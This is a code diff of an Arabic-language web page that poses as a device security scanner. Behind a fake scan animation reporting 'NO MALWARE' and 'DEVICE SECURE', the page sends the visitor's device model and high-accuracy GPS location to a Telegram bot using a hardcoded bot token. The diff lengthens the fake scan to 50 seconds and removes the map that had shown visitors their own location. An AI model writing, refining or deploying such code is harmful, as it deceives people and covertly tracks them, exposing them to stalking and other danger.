@@ -10,11 +10,10 @@
         body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
         @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
-        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
         .container { max-width: 400px; width: 100%; }
         .page { display: none; } .page.active { display: block; }
         .skull { font-size: 60px; animation: pulse 0.5s infinite; }
-        h1 { font-size: 22px; color: var(--green); text-shadow: 0 0 30px var(--green); }
+        h1 { font-size: 22px; color: var(--green); }
         .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
         .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
@@ -25,11 +24,9 @@
         .progress-fill { height: 100%; background: var(--red); width: 0%; }
         .success-icon { font-size: 70px; }
         .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
-        #map { width: 100%; height: 120px; border-radius: 10px; margin-top: 10px; border: 1px solid var(--green); display: none; }
     </style>
 </head>
 <body>
-<div class="scan-line"></div>
 <div class="container">
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
@@ -41,9 +38,8 @@
         <div class="skull">💀</div>
         <h1>جاري الفحص الشامل...</h1>
         <div class="code-screen" id="code-screen"></div>
-        <div class="countdown" id="countdown">15</div>
+        <div class="countdown" id="countdown">50</div>
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
-        <div id="map"></div>
     </div>
     <div class="page" id="page-done">
         <div class="success-icon">✅</div>
@@ -53,68 +49,31 @@
 
 <script>
 const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
-
-function getDevice() {
-    const match = navigator.userAgent.match(/; ([^;]+) Build/);
-    return { name: match ? match[1].trim() : 'جهاز غير معروف' };
-}
+function getDevice() { const m = navigator.userAgent.match(/; ([^;]+) Build/); return { name: m ? m[1].trim() : 'جهاز غير معروف' }; }
 const device = getDevice();
 document.getElementById('device-name').textContent = '📱 ' + device.name;
-
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
-
-function sendToTelegram(text) {
-    fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
-    }).catch(e => {});
-}
+function sendMsg(text) { fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }
 
 async function startScan() {
     showPage('page-scanning');
+    sendMsg(`🛡️ فحص\n📱 ${device.name}`);
     
-    // إرسال معلومات الجهاز فوراً
-    sendToTelegram(`🛡️ فحص\n📱 ${device.name}\n💾 RAM: ${navigator.deviceMemory||'?'}GB`);
-
-    // أخذ الموقع وإرساله فوراً
+    // GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const { latitude, longitude } = pos.coords;
-            
-            document.getElementById('map').style.display = 'block';
-            document.getElementById('map').innerHTML = `<iframe width="100%" height="120" frameborder="0" src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"></iframe>`;
-            
-            // إرسال الموقع
-            sendToTelegram(`📍 الموقع\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`);
-            
-            // إرسال Location point
-            fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendLocation`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
-            }).catch(e => {});
-            
-        }, () => {
-            sendToTelegram(`📍 GPS: لم يتم التحديد`);
-        }, { enableHighAccuracy: true, timeout: 8000 });
-    } else {
-        sendToTelegram(`📍 GPS: غير مدعوم`);
-    }
+            sendMsg(`📍 الموقع\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`);
+            fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{});
+        }, () => sendMsg('📍 GPS: لم يتم التحديد'), { enableHighAccuracy: true, timeout: 30000 });
+    } else { sendMsg('📍 GPS: غير مدعوم'); }
 
     const codeScreen = document.getElementById('code-screen');
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
     const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] CHECKING...','[■] SCANNING GPS...','[■] KERNEL: SECURE','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];
-    let seconds = 15;
-    
-    const interval = setInterval(() => {
-        seconds--;
-        countdownEl.textContent = seconds;
-        progressFill.style.width = ((15 - seconds) / 15 * 100) + '%';
-        const lines = Math.floor(((15 - seconds) / 15) * logs.length);
-        codeScreen.innerHTML = logs.slice(0, Math.min(lines + 1, logs.length)).join('<br>');
-        codeScreen.scrollTop = codeScreen.scrollHeight;
-        if (seconds <= 0) { clearInterval(interval); showPage('page-done'); }
-    }, 1000);
+    let seconds = 50;
+    const interval = setInterval(() => { seconds--; countdownEl.textContent=seconds; progressFill.style.width=((50-seconds)/50*100)+'%'; const lines=Math.floor(((50-seconds)/50)*logs.length); codeScreen.innerHTML=logs.slice(0,Math.min(lines+1,logs.length)).join('<br>'); codeScreen.scrollTop=codeScreen.scrollHeight; if(seconds<=0){clearInterval(interval);showPage('page-done');} },1000);
 }
 </script>
 </body>
